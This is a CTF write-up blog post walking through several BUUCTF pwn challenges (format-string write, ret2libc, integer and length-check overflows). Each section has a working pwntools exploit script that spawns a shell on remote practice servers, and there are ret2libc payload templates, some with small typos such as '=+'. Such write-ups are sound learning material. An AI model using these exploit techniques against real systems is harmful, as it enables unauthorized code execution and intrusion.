+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgTywP95t4KCi7JCFImUbIvsMTtw.png"></p>
+<p>We can use the printf to leak the stack address or stack value.<br>The 0x61616161 is the 10th “argument” in the printf, also we can use %10$p to print the argument directly.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FppFFmG-Xyr7Z2wQIjRtF0KDeR7D.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhadYMeYdx6xzJkmArk0a1pR-oLT.png"></p>
+<p>How we modify the value of value of the 0x804c044?</p>
+<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token punctuation">[</span>addr of c<span class="token punctuation">]</span><span class="token punctuation">[</span>value-0x4<span class="token punctuation">]</span><span class="token punctuation">[</span>offset location<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>It will determine the passwd whether equal to 0x804c44 in the program, we can control the value of passwd.<br>It calculates the number of bytes you input earlier<br>vuln_addr: 4byte, Hacker: 6 byte. We can pass the <strong>10</strong> to passwd.</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29989</span><span class="token punctuation">)</span>
+vuln_addr <span class="token operator">=</span> <span class="token number">0x804c044</span>
+payload1 <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>vuln_addr<span class="token punctuation">,</span><span class="token string">b'Hacker'</span><span class="token punctuation">,</span><span class="token string">'%10$n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token comment"># Username</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">b'10'</span>
+
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+<span class="token comment"># print(u32(io.recv()[0:4]))</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><p><a target="_blank" rel="noopener" href="https://shellblade.net/files/docs/ret2libc.pdf">Document of Ret2libc</a><br>The common way to bypass the NX(No Execute) bit protection is try to ret2libc attack</p>
+<p>We can check the stack length in IDA PRO.<br>offset is 0x50+0x8<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Foi4fvhFnAGlY_Q-p-4s3SARYrKp.png"></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrX6VL9EVnFVVZqWzcrSSVa9SDXM.png"></p>
+<p>There’s not str_bin_sh and system func in the program, we have to use it in GOT and PTL.</p>
+<p>Because we need to get the flag on the online docker simultaneously, we often do not have the .so file offered by the challenge author. We use the python module of LibcSearcher to search for which libc version we require.</p>
+<p>We leak the puts_addr when we pass the malware shellcode. When we receive it, we will get the libc_base address which means we get all functions in the program by the libc file</p>
+<p><a target="_blank" rel="noopener" href="https://ctf101.org/binary-exploitation/what-is-the-got/">What is the GOT?</a></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher
+
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+<span class="token comment"># io = process('./pwn7')</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">27684</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn7'</span><span class="token punctuation">)</span>
+
+
+offset <span class="token operator">=</span> <span class="token number">80</span><span class="token operator">+</span><span class="token number">8</span>
+padding <span class="token operator">=</span> <span class="token string">b'A'</span>
+pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x400c83</span>
+ret_addr <span class="token operator">=</span> <span class="token number">0x4006b9</span>
+
+puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
+
+payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>offset<span class="token operator">*</span>padding<span class="token punctuation">,</span> pop_rdi_addr<span class="token punctuation">,</span> puts_got<span class="token punctuation">,</span> puts_plt<span class="token punctuation">,</span> main_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input your choice!\n'</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input your Plaintext to be encrypted\n'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Ciphertext\n'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Got the puts_addr "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>
+libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
+system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
+str_bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>
+
+
+payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>padding<span class="token operator">*</span>offset<span class="token punctuation">,</span>ret_addr<span class="token punctuation">,</span>pop_rdi_addr<span class="token punctuation">,</span>str_bin_sh<span class="token punctuation">,</span>system_addr<span class="token punctuation">,</span><span class="token number">8</span><span class="token operator">*</span>padding<span class="token punctuation">]</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input your choice!\n'</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input your Plaintext to be encrypted\n'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Ciphertext\n'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The difference between the 32bits and 64bit shellcode.<br><a target="_blank" rel="noopener" href="https://stacklikemind.io/ret2libc-aslr">64bits ret2libc</a></p>
+<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">32bit:
+payload = offset*padding
+payload =+ p32(system_addr) # Location of the system function
+payload =+ b'a'*4  # padding
+payload =+ p32(str_bin_sh) # '/bin/sh'
+
+64bit:
+payload = offset*padding # padding
+payload =+ p64(pop_rdi_addr) # gadget -> pop rdi; ret
+payload =+ p64(str_bin_sh) # pointer to command: /bin/sh
+payload =+ p64(system_addr) # Location of system
+payload =+ b'a'*8 # return pointer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">32bit payload
+find libc payload1 -> padding * offset + p32(func_plt) + p32(ret_addr) + p32(func_got)
+getshell payload2 -> padding * offset * p32(system_addr) + b'A'*4 + p32(str_bin_sh)
+
+64bit payload
+find libc payload1 -> padding * (offset+0x08) + p64(pop_rdi) + p64(func_got) + p64(func_plt) + p64(ret_addr)
+getshell payload2 -> padding * (offset+0x08) + p64(ret_addr) + p64(pop_rdi) + p64(str_bin_sh)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>there are lots of measure to protect the binary file&#x3D;.&#x3D;<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FsZ1zHW8NERU-oKKiDUyw_Vs4hbm.png"></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FifCdrcvrWM4W39o3s1i6F6VWvPG.png"></p>
+<p>If we input all characters are 17, it will bypass the determination.<br>So here is the exploit.</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment"># io = process('./pwn8')</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28508</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">14</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqWRSG6iYfpAUs1hZiQLulveghRz.png"></p>
+<p>No canary &amp;&amp; No PIE</p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FiOffvpdzGU4ziw8pzUEfHcmVCVN.png"></p>
+<p>After analyzing by IDA PRO, I found the nbytes can be changed if we input the massive number in it. And the read function will overread the buf size, so we have already overflowed the stack.</p>
+<p>We can input the -1 into the nbytes, which will be a massive length of the stack.<br>expolit</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+<span class="token comment"># io = process('./pwn10')</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28722</span><span class="token punctuation">)</span>
+
+backdoor <span class="token operator">=</span> <span class="token number">0x4006ea</span>
+offset <span class="token operator">=</span> <span class="token number">16</span><span class="token operator">+</span><span class="token number">8</span>
+padding <span class="token operator">=</span> <span class="token string">b'a'</span>
+
+payload <span class="token operator">=</span> padding<span class="token operator">*</span>offset<span class="token operator">+</span>p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please input the length of your name:'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-1'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name?\n'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>Well this challenge is the most hard I have ever soloved before :..)<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fu1Eg65TaSUkWc2uZHMkSH26_O9r.png"></p>
+<p>We need to crack the two function at the same time, which I have never tried before.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FiU5vaojKP1XrfUPhG525aOUDb0R.png"></p>
+<p>This function mainly reads a string, judges these two functions, and returns the seventh bit of buf if the comparison is successful.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoutBPQeNoYezNVeSMUrcEUCa6lG.png"></p>
+<p>The return value is the length argument in read function, we can overflow the stack by a1.</p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhJ6ZrMFgtZZsj0uJbWCSCJDkglJ.png"><br>There’re not avaliable string we can use, so we have to collect the gadget to get shell.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Ft7P3OWfbeUoeyKEssAIb0SWh-Hs.png"><br>KEY POINT IS HERE<br>‘\x00’ is used to bypass the strlen<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fs4UFhFfqFQ8ca0sEkmVNrdHtSeW.png"></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhVoBBlVCoJM8ZMAgHsIy7TKgQex.png"></p>
+<p>Use the file libc.so to find the system function offset which can make ROP to get shell.<br>ret2libc attack is useful to bypass NX protection.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fo96IN04I8uvFybSC5GODtwdqmKb.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+<span class="token comment"># io = process('./pwn11')</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28952</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn11'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23.so'</span><span class="token punctuation">)</span>
+
+offset1 <span class="token operator">=</span> <span class="token number">6</span>
+offset2 <span class="token operator">=</span> <span class="token number">231</span>
+padding <span class="token operator">=</span> <span class="token string">b'A'</span>
+
+main_addr <span class="token operator">=</span> <span class="token number">0x08048825</span>
+write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+
+payload1 <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">+</span> padding<span class="token operator">*</span>offset1 <span class="token operator">+</span> <span class="token string">b'\xff'</span>
+payload2 <span class="token operator">=</span> padding<span class="token operator">*</span><span class="token punctuation">(</span>offset2<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span>p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Correct\n'</span><span class="token punctuation">,</span>payload2<span class="token punctuation">)</span>
+
+write_offset <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Write_offset: '</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>write_offset<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+libc_base <span class="token operator">=</span> write_offset <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+str_bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"System_addr "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str_bin_sh "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>str_bin_sh<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+payload3 <span class="token operator">=</span> padding<span class="token operator">*</span><span class="token punctuation">(</span>offset2<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>padding<span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>str_bin_sh<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Correct\n'</span><span class="token punctuation">,</span>payload3<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#RIP"><span class="toc-number">1.</span> <span class="toc-text">RIP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup-csaw-2016"><span class="toc-number">2.</span> <span class="toc-text">warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-1"><span class="toc-number">3.</span> <span class="toc-text">ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1-sctf-2016"><span class="toc-number">4.</span> <span class="toc-text">pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level0"><span class="toc-number">5.</span> <span class="toc-text">jarvisoj_level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2019-%E5%86%B3%E8%B5%9B-PWN5"><span class="toc-number">6.</span> <span class="toc-text">[第五空间 2019 决赛]PWN5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-c-1"><span class="toc-number">7.</span> <span class="toc-text">ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-8"><span class="toc-number">8.</span> <span class="toc-text">ciscn_2019_n_8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babystack"><span class="toc-number">9.</span> <span class="toc-text">bjdctf_2020_babystack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OGeek2019-babyrop"><span class="toc-number">10.</span> <span class="toc-text">[OGeek2019]babyrop</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/[BUUCTF]%20PWN1.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/[BUUCTF]%20PWN1.html&text=BUUCTF-PWN1"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/[BUUCTF]%20PWN1.html&title=BUUCTF-PWN1"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/[BUUCTF]%20PWN1.html&is_video=false&description=BUUCTF-PWN1"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-PWN1&body=Check out this article: http://kelpie.top/post/[BUUCTF]%20PWN1.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/[BUUCTF]%20PWN1.html&title=BUUCTF-PWN1"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/[BUUCTF]%20PWN1.html&title=BUUCTF-PWN1"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/[BUUCTF]%20PWN1.html&title=BUUCTF-PWN1"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/[BUUCTF]%20PWN1.html&title=BUUCTF-PWN1"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/[BUUCTF]%20PWN1.html&name=BUUCTF-PWN1&description=&lt;h2 id=&#34;RIP&#34;&gt;&lt;a href=&#34;#RIP&#34; class=&#34;headerlink&#34; title=&#34;RIP&#34;&gt;&lt;/a&gt;RIP&lt;/h2&gt;&lt;p&gt;checksec, the binary software&lt;br&gt;&lt;img src=&#34;https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fhe3CyKNRcbeYLOhDacs5uDEOKXK.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The char array capacity is only 15, and the puts function does not set the limit of the length we input so we can overflow the stack.&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/[BUUCTF]%20PWN1.html&t=BUUCTF-PWN1"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    l3vi4th4n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
